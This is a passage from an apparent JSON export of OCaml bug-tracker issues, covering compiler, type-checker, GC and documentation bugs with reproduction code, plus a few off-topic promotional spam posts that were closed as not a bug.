acc\r\n    else\r\n      flush (remaining - 1) (flush_once (minor_heap_size/2) acc)\r\n  in\r\n  flush count []\r\n\r\n(* Eat about 2MiB minor * 1000 = 2G of heap space *)\r\nlet large_heap = flush_minor 1000\r\n\r\nlet () =\r\n  let gc = Gc.get () in\r\n  let () = gc.Gc.verbose <- 0x2C7 in\r\n  (* The following does not help *)\r\n  (*let () = gc.Gc.space_overhead <- 20 in\r\n    let () = gc.Gc.max_overhead <- 300 in *)\r\n  Gc.set gc\r\n\r\n(* Repeatedly create 'inner_count' bigarrays,\r\n   then flush the minor heap a couple of times\r\n   to ensure the bigarrays are promoted to the\r\n   major heap.\r\n   The min1/min2/min3 control how many iterations\r\n   each set of bigarray will live. This is used to\r\n   ensure they get promoted to the major heap *)\r\nlet rec loop_outer inner_count min1 min2 _min3 =\r\n  let array_list = loop_inner inner_count in\r\n  let () = display_stat \"before minor\" in\r\n  let _ = flush_minor 2 in\r\n  let () = display_stat \"after minor\" in\r\n  loop_outer inner_count array_list min1 min2\r\n\r\nlet () = loop_outer 100 [] [] []\n\n## Additional information\n\nBEFORE:\r\n{\r\n'minor_words': 9435447783.000000, \r\n'promoted_words': 778137986.000000,\r\n'major_words': 2416836642.000000,\r\n'minor_collections': 36080,\r\n'major_collections': 137,\r\n\t\t'heap_words': 225660928, = 225*8 = 1,8GiB\r\n\t\t'heap_chunks': 27,\r\n\t\t'live_words': 62402914,  = 62*8 = 480MiB\r\n\t\t'live_blocks': 13320280,\r\n\t\t'free_words': 163239041, = 1,3GiB\r\n\t\t'free_blocks': 3332791,\r\n'largest_free': 14304445,\r\n\t\t'fragments': 18973, = 1MiB\r\n'compactions': 5,\r\n'top_heap_words': 427078656,\r\n'stack_size': 393}\r\n\r\nAFTER:\r\n{\r\n'minor_words': 9435449457.000000,\r\n'promoted_words': 778139391.000000,\r\n'major_words': 2416838047.000000,\r\n'minor_collections': 36082,\r\n'major_collections': 139,\r\n\t\t'heap_words': 7190016, = 56MiB\r\n\t\t'heap_chunks': 10,\r\n\t\t'live_words': 3778914, = 24MiB\r\n\t\t'live_blocks': 959892,\r\n\t\t'free_words': 3411102, = 27MiB\r\n\t\t'free_blocks': 3,\r\n'largest_free': 1352704,\r\n\t\t'fragments': 0,\r\n'compactions': 6,\r\n'top_heap_words': 427078656,\r\n'stack_size': 393}\n"},{"labels":["bug"],"text":"**Original bug ID:** 1449\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI'm forwarding this bug regarding the camlp4 documentation (it's the\nreference manual).\n\nBest regard\n\nRemi Vanicat.\n\n\n\n----------------\nReturn-Path: <debbugs@master.debian.org>\nX-Sieve: cmu-sieve 2.0\nReceived: from localhost (localhost.localdomain [127.0.0.1])\n\tby iona.labri.fr (Postfix) with ESMTP id 9ED5C7E2C\n\tfor <vanicat+debianfwd@labri.fr>; Thu, 17 Oct 2002 16:33:06 +0200 (CEST)\nReceived: from master.debian.org (master.debian.org [65.125.64.135])\n\tby iona.labri.fr (Postfix) with ESMTP id DCB457E34\n\tfor <vanicat+debianfwd@labri.fr>; Thu, 17 Oct 2002 16:33:04 +0200 (CEST)\nReceived: from debbugs by master.debian.org with local (Exim 3.12 1 (Debian))\n\tid 182Bhv-0002LG-00; Thu, 17 Oct 2002 09:33:03 -0500\nX-Loop: owner@bugs.debian.org\nSubject: Bug#165189: wrong links in camlp4 documentation\nReply-To: Stefano Zacchiroli <zack@debian.org>,\t165189@bugs.debian.org\nResent-From: Stefano Zacchiroli <zack@debian.org>\nResent-To: debian-bugs-dist@lists.debian.org\nResent-Cc: Remi Vanicat <vanicat@debian.org>,\n\tocaml-doc@packages.qa.debian.org\nResent-Date: Thu, 17 Oct 2002 14:33:01 GMT\nResent-Message-ID: <handler.165189.B.10348650888737@bugs.debian.org>\nX-Debian-PR-Message: report 165189\nX-Debian-PR-Package: ocaml-doc\nX-Debian-PR-Keywords: \nReceived: via spool by submit@bugs.debian.org id=B.10348650888737\n          (code B ref -1); Thu, 17 Oct 2002 14:33:01 GMT\nMessage-Id: <200210171431.g9HEVAIw028683@lordsoth.takhisis.org>\nFrom: Stefano Zacchiroli <zack@debian.org>\nTo: Debian Bug Tracking System <submit@bugs.debian.org>\nX-Mailer: reportbug 2.4\nDate: Thu, 17 Oct 2002 16:31:10 +0200\nDelivered-To: submit@bugs.debian.org\nX-Spam-Status: No, hits=0.8 required=5.0\n\ttests=MSG_ID_ADDED_BY_MTA_3,SPAM_PHRASE_00_01\tversion=2.41\nX-Spam-Level: \nResent-Sender: Debian BTS <debbugs@master.debian.org>\nX-Virus-Scanned: by AMaViS new-20020517\nX-Razor-id: d4e7d0b111e5483f162b91c4144cfa2dab697475\nMIME-Version: 1.0\nContent-Type: text/plain; charset=us-ascii\n\nPackage: ocaml-doc\nVersion: 3.06.1-1\nSeverity: normal\n\nPage /usr/share/doc/ocaml/docs/camlp4.html/manual009.html have all links\nin section \"Other modules\" pointing to the same page, the one referring\nto \"Grammar\" module, that is\n/usr/share/doc/ocaml/docs/camlp4.html/lib/Grammar.html.\n\nIs thus impossible via that page to reach directly module, for example,\n\"Pcaml\".\n\nCheers.\n\n-- System Information:\nDebian Release: testing/unstable\nArchitecture: i386\n\n\n----------------\n\n\n-- \nRÃ©mi Vanicat\nvanicat@labri.u-bordeaux.fr\nhttp://dept-info.labri.u-bordeaux.fr/~vanicat\n\n----------------\n----------------\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7747\n**Reporter:** kantian\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2018-03-01T07:10:00Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n**Related to:** #7739\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nI allready mentioned the problem in the discussion about MPR #7739 issue, but I think it deserves its own independant report.\r\n\r\nNormally cycles in types defintion are disallowed by the type checker, as in this example:\r\n\r\nmodule rec M : sig type t = N.t end = struct type t end\r\nand N : sig type t = M.t end = struct type t = M.t end;;\r\nError: The definition of M.t contains a cycle:\r\n       N.t\r\n\r\nBut with GADT we can hide this cycle and reveal it only when inspecting an equality witness value. In some cases this can put the type checker in an infinite loop and memory consumption increases drastically (around 1 GB per 10 seconds on my computer).\r\n\r\nThe reproduction case (below) is pretty pathological and a corner case, but I don't know if such situation can appear in a more realistic code wich combines GADT and private types.\n\n## Steps to reproduce\n\ntype (_,_) eq = Refl : ('a,'a) eq\r\n\r\nmodule M = struct type t end\r\nmodule N : sig type t = private M.t val eq : (t, M.t) eq end =\r\n  struct type t = M.t let eq = Refl end\r\n\r\n(*\r\n  as long as we are casting between M.t and N.t\r\n  there is no problem, this will type check.\r\n*)\r\n\r\nlet f x = match N.eq with Refl -> (x : N.t :> M.t)\r\n\r\nlet f x = match N.eq with Refl -> (x : M.t :> N.t)\r\n\r\n(*\r\n  but as soon we're trying to cast to another type,\r\n  the type checker will never return and memory\r\n  consumption will increase drastically.\r\n*)\r\n\r\nlet f x = match N.eq with Refl -> (x : N.t :> int)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7742\n**Reporter:** kantian\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-02-22T10:54:05Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Category:** lexing and parsing\n\n## Bug description\n\nCode is better than a long discourse:\n\n## Steps to reproduce\n\nmodule M = struct type t = {x:int} let id x = x end\r\nmodule N = struct type t = {x:int} let id x = x end\r\n\r\n(* type error as expected *)\r\n{M.x = 1} = {N.x = 1};;\r\nError: The field N.x belongs to the record type N.t\r\n       but a field was expected belonging to the record type M.t\r\n\r\n(*\r\n  Only warning if the module name is put outside the record construct.\r\n  The field `x' in the second expression is interpreted as M.x and not N.x,\r\n  hence the two values are equal.\r\n*)\r\nM.{x = 1} = N.{x = 1};;\r\nCharacters 12-21:\r\nWarning 40: this record of type M.t contains fields that are \r\nnot visible in the current scope: x.\r\nThey will not be selected if the type becomes unknown.\r\n- : bool = true\r\n\r\n(* same as before but with local open: its worse since there is no warning *)\r\nlet open M in {x = 1} = let open N in {x = 1};;\r\n- : bool = true\r\n\r\n(* but there is no problem if we add a function application *)\r\nM.(id {x = 1}) = N.(id {x = 1});;\r\nError: This expression has type t but an expression was expected of type M.t\r\n\r\n\r\nlet open M in id {x = 1} = let open N in id {x = 1};;\r\nError: This expression has type N.t but an expression was expected of type M.t\r\n\r\n(* and no problem if we let bind the constructions before comparaison *)\r\nlet i = M.{x = 1} in\r\nlet j = N.{x = 1} in\r\ni = j;;\r\nError: This expression has type N.t but an expression was expected of type M.t\r\n\r\n(* it works as expected in pattern matching *)\r\nfunction M.{x = 1}, N.{x = 1} -> () | _ -> ();;\r\n- : M.t * N.t -> unit = <fun>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7740\n**Reporter:** vanto\n**Status:** resolved (set by @xavierleroy on 2018-02-21T14:52:00Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**OS:** Debian\n**OS Version:** 9\n**Version:** 4.02.3\n**Category:** compiler driver\n**Related to:** #7737\n\n## Bug description\n\nversion 4.02.3-9 for Debian\r\n\r\nvanto@debian9:~$ ocaml\r\n        OCaml version 4.02.3\r\n\r\n# int_of_char ('a');;\r\n- : int = 97\r\n# int_of_char (_'Ã©');;;\r\nWarning 3: deprecated: ISO-Latin1 characters in identifiers\r\nError: Syntax error: operator expected.\r\n# \r\n\r\nthis error also occurs with version 4.01.0-5 for Debian.\n\n## Steps to reproduce\n\nType in a terminal (linux) int_of_char ('Ã©');;\r\nthen Enter\r\nat this moment a warning and an error message appears, but the line \r\nhas changed.\r\nan underscore was added under the first apostrophe and a third \r\nsemi-colon appeared after the other two as you can see above. (I \r\nhad to add the underscore here because it was not saved in the copy and \r\npaste.But in reality the underscore is well below the first apostrophe)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7739\n**Reporter:** kantian\n**Assigned to:** @garrigue\n**Status:** confirmed (set by @garrigue on 2018-02-26T06:26:13Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** typing\n**Related to:** #7747\n**Monitored by:** @gasche @lpw25\n\n## Bug description\n\nAfter a discussion on OCaml discuss, I noticed there is a different behavior between abstract types and private aliased types against type equality. Leo White advised me to report this on Mantis, hence I do.\n\n## Steps to reproduce\n\ntype (_,_) eq = Refl : ('a, 'a) eq\r\n\r\nmodule M : sig\r\n  type t\r\n  val eq : (t, int) eq\r\nend = struct\r\n  type t = int\r\n  let eq = Refl\r\nend\r\n\r\nmodule N : sig\r\n  type t = private int\r\n  val eq : (t, int) eq\r\nend = struct\r\n  type t = int\r\n  let eq = Refl\r\nend\r\n\r\nlet (i : M.t) = match M.eq with Refl -> 1;;\r\nval i : M.t = <abstr>\r\n\r\nlet (i : N.t) = match N.eq with Refl -> 1;;\r\nError: This expression has type int but an expression was expected of type N.t\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7738\n**Reporter:** @rixed\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-02-21T10:45:02Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.1\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** compiler driver\n\n## Bug description\n\nWhen using the compiler-libs in a program and trying to compile several source codes I noticed some options to gcc accumulated from one compilation to the next, despite I've tried to cleaned as many global variables as I could, including via Asmlink.reset().\r\n\r\nProblem seems to be that the aforementioned reset function does not clean lib_ccobjs or lib_ccopts.\r\n\r\nA quick test suggest that cleaning those does fix my issue without introducing any bug I could notice.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7737\n**Reporter:** vanto\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-02-20T22:02:48Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** compiler driver\n**Related to:** #7740\n\n## Bug description\n\nReference manual page 110. It is written: \"The current implementation interprets character codes between 128 and 255 following the ISO 8859-1 standard.\"\r\nBut the given codes are wrong after code 126 (7Eh).\r\nexamples:\r\n# int_of_char('Â£');;\r\n- : int = 156\r\ninstead of 163 (A3h)\r\n\r\n# int_of_char('Ã©');;\r\n- : int = 130\r\ninstead of 233 (E9h)\r\n\r\n... and so on.\r\nThe result is the same if I open the module Char.\r\n# open Char;;\r\n# code 'Ã©';;\r\n- : int = 130 (* instead of 233 *)\r\n# code 'Â£';;\r\n- : int = 156 (* instead of 163 *)\r\n... and so on.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1448\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi. I'm new to ocaml and think it's a great language. However I \nencountered this problem and was wondering if it was a known issue...\n\nI've noticed that line numbers (or more precisely, character positions) \naren't reported properly by the debugger or backtrace facility. Needless \nto say, this is somewhat annoying during debugging. Here's a simple test \nprogram that exhibits the problem:\n\n(* test for reported character positions *)\n\nexception Testing\n\nlet rec fact n =\n  if n = 1 then\n    raise Testing\n  else\n    n * fact(n - 1)\n\nlet foo n =\n  fact n + 3\n\nlet bar n = \n  foo n\n\nlet test () =\n  bar 4\n\nlet _ = test()\n\n(* end of test *)\n\nI compile and run this test program as follows:\n\n    # ocamlc -g test.ml\n    # ocamlrun -b camlprog.exe\n    Fatal error: exception Test.Testing\n    Raised at module Test, character 120\n    Called from module Test, character 149\n    Called from module Test, character 149\n    Called from module Test, character 149\n    Called from module Test, character 174\n    Called from module Test, character 247\n\nThe reported character positions correspond to the following places in \nthe file:\n\n    * 120: the 's' in the word 'else' in the function 'fact'\n    * 149: the 'f' in 'foo' on the 'let foo n =' line\n    * 174: the 'b' in 'bar' on the 'let bar n =' line\n    * 247: the ')' at the end of the last comment.\n\nI suspected that because this was on Windows the LF vs CRLF problem was \nthe culprit, so I added the gratuitous CRs to the file and tried again. \nThis time I got this:\n\n    Fatal error: exception Test.Testing\n    Raised at module Test, character 126\n    Called from module Test, character 157\n    Called from module Test, character 157\n    Called from module Test, character 157\n    Called from module Test, character 185\n    Called from module Test, character 266\n\nThese correspond as follows:\n\n    * 126: the 'l' in the word 'else' in the function 'fact'\n    * 157: the ' ' after 'let' on the 'let foo n =' line\n    * 185: the 't' in 'let' on the 'let bar n =' line\n    * 266: the ' ' after 'test' in last comment.\n\nThe first 2 are 1 char before the previous result, the next 2 are 2 \nbefore the previous result -- not consistently off, so something is \nseriously wrong here. I've tried this with both the cygwin and native \nports, and both had the same problem.\n\nAnother problem is that some stack frames seem to be dropped. As I see \nit, fact is called with 7, so there should be 5 recursive calls on its \nlast line. Instead 3 are (trying to be) shown. Also, some of the simpler \nfunctions don't appear to have frames. Maybe this is because of \ninlining, but I wouldn't think you would want inlining with the -g \noption precisely because you're trying to trace the flow according to \nwhat you've written.\n\nPerhaps there's something obvious that I need to do to correct my ocaml \nenvironment, but I suspect that this is a real bug and it's biting \neveryone, at least on Windows. I'm willing to help debug the problem, \nbut could use some pointers on where to look. I started by looking at \nthe lexer, but it appears to deal with line numbers, not character \npositions, so I'm doubly confused.\n\nThanks,\n\nWarren Harris\n\n\n\n----------------\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html;charset=ISO-8859-1\">\n  <title></title>\n</head>\n<body>\n<tt>Hi. I'm new to ocaml and think it's a great language. However I encountered\nthis problem and was wondering if it was a known issue...<br>\n<br>\nI've noticed that line numbers (or more precisely, character positions) aren't\nreported properly by the debugger or backtrace facility. Needless to say,\nthis is somewhat annoying during debugging. Here's a simple test program\nthat exhibits the problem:<br>\n</tt>\n<blockquote>\n  <pre><tt>(* test for reported character positions *)\n\nexception Testing\n\nlet rec fact n =\n  if n = 1 then\n    raise Testing\n  else\n    n * fact(n - 1)\n\nlet foo n =\n  fact n + 3\n\nlet bar n = \n  foo n\n\nlet test () =\n  bar 4\n\nlet _ = test()\n\n(* end of test *)\n</tt></pre>\n</blockquote>\n<pre><tt>I compile and run this test program as follows:\n</tt></pre>\n<blockquote><tt># ocamlc -g test.ml<br>\n# ocamlrun -b camlprog.exe <br>\n  </tt><tt>Fatal error: exception Test.Testing<br>\nRaised at module Test, character 120<br>\nCalled from module Test, character 149<br>\nCalled from module Test, character 149<br>\nCalled from module Test, character 149<br>\nCalled from module Test, character 174<br>\nCalled from module Test, character 247</tt></blockquote>\n<tt>The reported character positions correspond to the following places in\nthe file:<br>\n</tt>\n<ul>\n  <li><tt>120: the 's' in the word 'else' in the function 'fact'</tt></li>\n  <li><tt>149: the 'f' in 'foo' on the 'let foo n =' line</tt></li>\n  <li><tt>174: the 'b' in 'bar' on the 'let bar n =' line</tt></li>\n  <li><tt>247: the ')' at the end of the last comment.</tt></li>\n</ul>\n<tt>I suspected that because this was on Windows the LF vs CRLF problem was\nthe culprit, so I added the gratuitous CRs to the file and tried again. This\ntime I got this:<br>\n</tt>\n<blockquote><tt>Fatal er</tt><tt>ror: exception Test.Testing<br>\nRaised at module Test, character 126<br>\nCalled from module Test, character 157<br>\nCalled from module Test, character 157<br>\nCalled from module Test, character 157<br>\nCalled from module Test, character 185<br>\nCalled from module Test, character 266<br>\n  </tt></blockquote>\n<tt>These correspond as follows:<br>\n</tt>\n<ul>\n  <li><tt>126: the 'l' in the word 'else' in the function 'fact'</tt></li>\n  <li><tt>157: the ' ' after 'let' on the 'let foo n =' line</tt></li>\n  <li><tt>185: the 't' in 'let' on the 'let bar n =' line</tt></li>\n  <li><tt>266: the ' ' after 'test' in last comment.</tt></li>\n</ul>\n<tt>The first 2 are 1 char before the previous result, the next 2 are 2 before\nthe previous result -- not consistently off, so something is seriously wrong\nhere. I've tried this with both the cygwin and native ports, and both had\nthe same problem.<br>\n<br>\nAnother problem is that some stack frames seem to be dropped. As I see it,\nfact is called with 7, so there should be 5 recursive calls on its last line.\nInstead 3 are (trying to be) shown. Also, some of the simpler functions don't\nappear to have frames. Maybe this is because of inlining, but I wouldn't\nthink you would want inlining with the -g option precisely because you're\ntrying to trace the flow according to what you've written.<br>\n<br>\nPerhaps there's something obvious that I need to do to correct my ocaml environment,\nbut I suspect that this is a real bug and it's biting everyone, at least\non Windows. I'm willing to help debug the problem, but could use some pointers\non where to look. I started by looking at the lexer, but it appears to deal\nwith line numbers, not character positions, so I'm doubly confused.<br>\n<br>\nThanks,<br>\n<br>\nWarren Harris<br>\n</tt><tt><br>\n<br>\n</tt>\n</body>\n</html>\n\n----------------\n----------------\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7735\n**Status:** closed (set by @xavierleroy on 2018-02-21T18:37:25Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** documentation\n\n## Bug description\n\nA gig economy is a condition in which brief positions are ordinary and affiliations contract with free specialists for right now engagements.\n\n## Additional information\n\nThe career world has rapidly changed and these days, long-term careers and people working in just one job are slowly but steadily becoming a thing of the past. In fact, according to research, in the year 2015, between three people, one person in Australia was doing some sort of freelance or contract work. There are many reasons that are attributed to the growth of the gig economy. First of all, there has been an emergence of technology that cannot be ignored and that has played a tremendous role in connecting businesses with freelancers.\r\nOn a light note, Robin Chase who is Zipcarâs founder put it that her father worked in one job, worked for six jobs himself and now, she foresees her children working for six jobs at once. Many people have been very pessimistic when matters related to the advantages that accompany the gig economy.\r\nhttps://www.fieldengineer.com/blogs/freelance-field-engineers-telecom-using-gig-economy-bring-change-lives/\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7733\n**Reporter:** nkrishnafe\n**Assigned to:** @trefis\n**Status:** closed (set by @trefis on 2018-02-19T09:46:02Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** FE\n**OS:** Linux\n**OS Version:** 2.0\n**Category:** web site\n\n## Bug description\n\nA Network Administrator is basically in charge of the everyday upkeep of an organization's system and PC framework. They repair issues that fly in day by day use and work on long haul ventures, for example, information reinforcement or overseeing media communications systems. \r\n\r\nA Network Administrator responsibilities may include: \r\n\r\nIntroducing equipment and programming \r\n\r\nRepairing equipment and programming \r\n\r\nPreparing others in the workplace on the most proficient method to utilize equipment and programming \r\n\r\nIntroducing and directing the correct capacity of PC security frameworks \r\n\r\nObserving PC framework speed and execution \r\n\r\nActualizing changes in PC framework speed and execution, when essential \r\n\r\nIncluding or erasing clients from the system, and refreshing security authorizations, as justified Tackling issues for singular workers' PC frameworks.\r\n\r\nhttps://www.fieldengineer.com/skills/what-is-a-freelance-network-administrator/\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7732\n**Reporter:** nkrishnafe\n**Status:** closed (set by @xavierleroy on 2018-02-21T18:38:02Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** FE\n**OS:** Linux\n**OS Version:** 2.0\n**Category:** web site\n\n## Bug description\n\nA Network Administrator is basically in charge of the everyday upkeep of an organization's system and PC framework. They repair issues that fly in day by day use and work on long haul ventures, for example, information reinforcement or overseeing media communications systems. \r\n\r\nA Network Administrator responsibilities may include: \r\n\r\nIntroducing equipment and programming \r\n\r\nRepairing equipment and programming \r\n\r\nPreparing others in the workplace on the most proficient method to utilize equipment and programming \r\n\r\nIntroducing and directing the correct capacity of PC security frameworks \r\n\r\nObserving PC framework speed and execution \r\n\r\nActualizing changes in PC framework speed and execution, when essential \r\n\r\nIncluding or erasing clients from the system, and refreshing security authorizations, as justified.\r\n\r\nhttps://www.fieldengineer.com/skills/what-is-a-freelance-network-administrator/\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7731\n**Reporter:** kkaveri\n**Status:** closed (set by @xavierleroy on 2018-02-19T09:18:29Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.00.1\n**Category:** web site\n\n## Bug description\n\nTelecom Engineering is most likely one of those fields that has seen fast headway as of late. It shocks no one that it is among the most sought after vocations today. Regardless of whether you are a fulltime worker, hoping to procure a couple of additional bucks by the side, or you are an independently employed architect, essentially attempting to get your business up and running, there is much degree in independent telecom build. \r\n\r\nView Url: https://www.fieldengineer.com/blogs/job-description-field-engineer/\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7729\n**Reporter:** ab\n**Assigned to:** @nojb\n**Status:** assigned (set by @nojb on 2018-09-28T10:43:30Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** all\n**OS:** all\n**OS Version:** all\n**Version:** 4.06.1\n**Category:** runtime system and C interface\n**Monitored by:** @nojb\n\n## Bug description\n\nclang -Wreserved-id-macro -x c /dev/null -S -include $(ocamlc -where)/caml/misc.h\r\nIn file included from :1:\r\n/net/lib/ocaml/caml/misc.h:208:9: warning: macro name is a reserved identifier\r\n[-Wreserved-id-macro]\r\n#define _T(x) x\r\n^\r\n1 warning generated.\r\n\r\n===\r\n7.1.3 of ISO/IEC 9899:201x in part reads:\r\n\r\nAll identifiers that begin with an underscore and either an uppercase letter or another\r\nunderscore are always reserved for any use.\n\n## Steps to reproduce\n\nclang -Wreserved-id-macro -x c /dev/null -S -include $(ocamlc -where)/caml/misc.h\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7728\n**Reporter:** vanto\n**Status:** resolved (set by @xavierleroy on 2018-02-17T18:12:57Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** compiler driver\n**Duplicate of:** #7727\n\n## Bug description\n\nIf a line has three semicolons, there is an error. If it has four semicolons, there is no error. And so on, there is an error for semicolons that are odd number and no error for semicolons that are even number.\r\nexample:\r\nlet a = 12;; (* OK *)\r\nlet a = 12;;; (* error *)\r\nlet a = 12;;;; (* OK *)\r\nlet a = 12;;;;; (* error *)\r\n... and so on.\r\nLikewise,\r\nlet a = 12;;12 (* Error: This expression has type int\r\n       This is not a function; it cannot be applied. *)\r\nlet a = 12;;12;; (* OK *)\r\nlet a = 12;;12;;; (* Error: Syntax error *)\r\nlet a = 12;;12;;;; (* OK *)\r\n... and so on.\r\nThis does not seem to disturb the compilation and does not seem to \r\nrepresent a potential danger.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7727\n**Reporter:** vanto\n**Status:** resolved (set by @xavierleroy on 2018-02-17T16:46:17Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** toplevel\n**Has duplicate:** #7728\n**Monitored by:** @gasche\n\n## Bug description\n\nToplevel system 4.06. Reference manual 4.06 page 213.\r\nIt is written \"A line is terminated by ;; (a double-semicolon).\"\r\nBut we notice that we can write several semicolons at the end of a line and get the result without an error notification.\r\nWe can write several lines ending with several semicolons, there will never be any error mentioned.\r\nBelow, example in OCaml 4.06:\r\n# \"zs\";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\r\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\r\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\r\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\r\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\r\n;;;;;;;;;;;;;\r\n- : string = \"zs\"\r\n# 45;;;\r\n- : int = 45\r\n# 89;;;\r\n- : int = 89\r\n# 1234;;;;\r\n- : int = 1234\r\n\r\nit seems that this continues since Caml Light release 0.74, except \r\nthat Caml Light only accepts three semicolons (;;;) without error. \r\nBut in the next line if we write another line, even correct, the error \r\nis this time mentioned.\r\nBelow, example in Caml Light:\r\n#\"aa\";;\r\n- : string = \"aa\"\r\n#\"bb\";;;\r\n- : string = \"bb\"\r\n#\"cc\";;\r\nEntrÃ©e interactive:\r\n>\"bb\";;;\r\n>      ^\r\nErreur de syntaxe.\r\n#\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7726\n**Reporter:** @yallop\n**Assigned to:** @garrigue\n**Status:** confirmed (set by @garrigue on 2018-02-27T08:59:23Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** typing\n**Related to:** #3935 #7611\n**Monitored by:** @gasche\n\n## Bug description\n\nUsing recursive modules it's possible to build equi-recursive types, like this one\r\n\r\n   type t = t option\r\n\r\neven when -rectypes is not enabled:\r\n\r\n   module type T = sig type t end\r\n\r\n   module Fix(F:(T -> T)) = struct\r\n     module rec Fixed : T with type t = F(Fixed).t = F(Fixed)\r\n   end\r\n\r\n   module T = Fix(functor (X:sig type t end) -> struct type t = X.t option end)\r\n\r\n   (* T.Fixed.t = T.fixed.t option *)\r\n\r\nSince the type recursion is not manifest, the checks associated with -rectypes don't kick in, and it's also possible to construct types that even -rectypes doesn't allow, such as\r\n\r\n   type t = t\r\n\r\nas the following code does:\r\n\r\n   module T = Fix(functor (X:sig type t end) -> struct type t = X.t end)\r\n\r\nleading to a compile-time error:\r\n\r\n   Fatal error: exception Stack overflow\n"},{"labels":["bug"],"text":"**Original bug ID:** 7725\n**Reporter:** @shindere\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-05-10T12:15:53Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** trivial\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** misc\n\n## Bug description\n\nWhen actually ran (afl-showmap available and compiler configured with -afl-instrument) this test fails. Was not able to find a version on trunk where this works, not even after #1345 was merged, whereas it was supposed to fix the \"class\" test which is the one that is broken.\n\n## Steps to reproduce\n\n./configure -afl-instrument\r\nmake world.opt\r\ncd testsuite\r\nmake one DIR=tests/afl-instrumentation\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7723\n**Reporter:** @lpw25\n**Assigned to:** @lpw25\n**Status:** assigned (set by @garrigue on 2018-04-03T01:43:15Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** typing\n**Monitored by:** @Drup @gasche\n\n## Bug description\n\n[with type] will remove module aliases. This allows inconsistent module types to be made, which can then be realized through recursive modules and used to break soundness. I don't think this can cause segfaults, but it does, for example, allow us to prove that all [Set] types are equal if their element type is equal:\r\n\r\n    type (_, _) eq = Refl : ('a, 'a) eq\r\n\r\n    module Equal (M : Set.OrderedType) (N : Set.OrderedType with type t = M.t) : sig\r\n      val eq : (Set.Make(M).t, Set.Make(N).t) eq\r\n    end = struct\r\n      type meq = Eq of (Set.Make(M).t, Set.Make(M).t) eq\r\n      module type S = sig\r\n        module N = M\r\n        type neq = meq = Eq of (Set.Make(M).t, Set.Make(N).t) eq\r\n      end\r\n      module type T = S with type N.t = M.t with module N := N;;\r\n      module rec T : T = T\r\n      let eq =\r\n        let T.Eq eq = Eq Refl in\r\n        eq\r\n    end\n"},{"labels":[null,null,"bug"],"text":"**Original bug ID:** 7722\r\n**Reporter:** smuenzel-js\r\n**Status:** acknowledged (set by @xavierleroy on 2018-02-17T17:07:09Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.06.0\r\n**Category:** back end 